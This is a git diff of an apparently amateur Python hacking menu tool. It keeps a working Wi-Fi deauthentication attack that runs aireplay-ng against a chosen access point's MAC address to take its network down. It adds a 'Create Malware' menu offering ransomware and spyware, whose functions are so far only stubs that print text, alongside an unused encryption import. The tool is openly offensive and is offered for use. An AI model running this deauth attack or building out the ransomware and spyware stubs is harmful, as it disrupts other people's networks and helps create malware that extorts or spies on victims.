@@ -2,9 +2,20 @@ import subprocess
 from subprocess import *
 from imports import *
 import random
+from cryptography.fernet import Fernet
 
 color = Colors()
 logo = random.choice(logos)
+
+exitTry = False
+
+
+##########                                                                                                                             ##########
+#################################################################################################################################################
+##################################################\---   OPTION FUNCTIONS   ---/#################################################################
+#################################################################################################################################################
+##########                                                                                                                             ##########
+
 
 def StopMonitoringMode():
     call([ "sudo", "airmon-ng", "stop", "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
@@ -95,25 +106,86 @@ def StartDeauthAttack():
     call([ "echo", f"{color.blue}WIFI IS DOWN{color.white}" ])
     call([ "echo", f"sudo aireplay-ng -0 0 -a {MACs[ID]} wlan0{color.red}" ])
     call([ "sudo", "aireplay-ng", "-0", "0", "-a", MACs[ID], "wlan0" ], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
+
+def CreateMalware():
+    call([ "clear" ])
+    exitOption = False
+    malwareOption = ""
+    call([ "echo", malware_logo ])
+    call([ "echo", f"{color.nocolor}Options:" ])
+    call([ "echo", f"\t{color.red}1){color.yellow} RANSOMWARE" ])
+    call([ "echo", f"\t{color.red}2){color.yellow} SPYWARE" ])
+    malwares = ["ransomware", "spyware"]
+
+    while True:
+        try:
+            malwareOption = str(input(f"\n{color.blue}malware{color.white}> "))
+            exitOption = False
+            if(malwareOption == "exit"):
+                return 0
+            else:
+                try:
+                    malwareOption = int(malwareOption)
+                    if(malwareOption > len(malwares)):
+                        call([ "echo", f"! {color.red}Invalid Option{color.white} !\n" ])
+                        continue  
+                except:
+                    call([ "echo", f"n{color.red}Invalid Option{color.white}\n" ])
+                    continue
+            break
+        except:
+            if not exitOption:
+                print(f"\nTo exit type {color.red}exit{color.white} or press {color.red}Ctrl+C{color.white} again.")
+                exitOption=True
+                continue
+            return
     
+    if malwareOption == 1:
+        createRansomware()
+    elif malwareOption == 2:
+        createSpywere()
+
+def createRansomware():
+    call([ "echo", f"{color.blue}Creating Ransomwere{color.white}" ])
+
+def createSpywere():
+    call([ "echo", f"{color.blue}Creating Spywere{color.white}" ])
+
+##########                                                                                                                             ##########
+#################################################################################################################################################
+####################################################\---   HELP OPTIONS   ---/####################################################################
+#################################################################################################################################################
+##########                                                                                                                             ##########
+
 def StartUpScreen():
     call([ "clear" ])
     call([ "echo", logo ])
     call([ "echo", f"{color.nocolor}Options:" ])
     call([ "echo", f"\t{color.red}1){color.yellow} Start the deauth attack." ])
     call([ "echo", f"\t{color.red}2){color.yellow} Stop Monitoring mode." ])
-    call([ "echo", f"\t{color.red}3){color.yellow} Brutte force password." ])
+    call([ "echo", f"\t{color.red}3){color.yellow} Create Malware." ])
 
 def HelpScreen():
     call([ "echo", helpScreenString ])
 
 
+
+##########                                                                                                                             ##########
+#################################################################################################################################################
+##################################################\---   PROGRAM MAIN LOOP   ---/################################################################
+#################################################################################################################################################
+##########                                                                                                                             ##########
+
 StartUpScreen()
 while True:
     try:
         command = str(input(f"\n{color.nocolor}console> "))
+        exitTry = False
     except:
-        print(f"\nTo exit type {color.red}exit{color.white}.")
+        if(exitTry):
+            break
+        print(f"\nTo exit type {color.red}exit{color.white} or press {color.red}Ctrl+C{color.white} again.")
+        exitTry=True
         continue
     
     if(command == '1'):
@@ -121,6 +193,9 @@ while True:
         
     elif(command == '2'):
         StopMonitoringMode()
+    
+    elif(command == '3'):
+        CreateMalware()
     
     elif(command == 'clear'):
         StartUpScreen()
